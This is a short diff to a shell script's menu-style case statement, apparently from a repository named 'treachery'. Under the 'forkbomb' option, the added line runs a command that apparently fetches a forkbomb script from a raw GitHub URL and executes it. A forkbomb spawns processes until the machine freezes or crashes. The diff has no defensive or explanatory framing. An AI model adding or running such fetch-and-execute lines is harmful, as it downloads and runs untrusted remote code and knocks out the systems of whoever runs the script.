@@ -15,6 +15,7 @@ case "$1" in
 	;;
 	"forkbomb")
 		echo -n "Forkbomb chosen\n"
+		webrun https://raw.githubusercontent.com/BeerB34r/treachery/refs/heads/master/assorted/forkbomb.sh
 	;;
 	"To be implemented")
 		echo -n "Yet to be implemented\n"
